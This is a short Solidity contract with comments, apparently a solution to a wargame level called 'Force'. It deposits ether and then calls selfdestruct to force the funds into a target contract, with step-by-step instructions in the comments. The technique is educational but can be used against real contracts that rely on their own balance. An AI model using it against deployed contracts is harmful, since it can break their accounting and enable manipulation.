// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Payer {
    uint256 public balance = 0;

    function destruct(address payable _to) external payable {
        selfdestruct(_to);
    }

    function deposit() external payable {
        balance += msg.value;
    }
}

//
// 1. send a value of say, 10000000000000 wei (0.00001 eth) by calling deposit, so that Payer's balance increases to same amount
// 2. get instance address of Force in console -> contact.address
// 3. call destruct of Payer with <your-contact-address> as parameter. that's destroy Payer and send all of it's funds to Force
// 4. verify by -> await getBalance(contract.address)
//
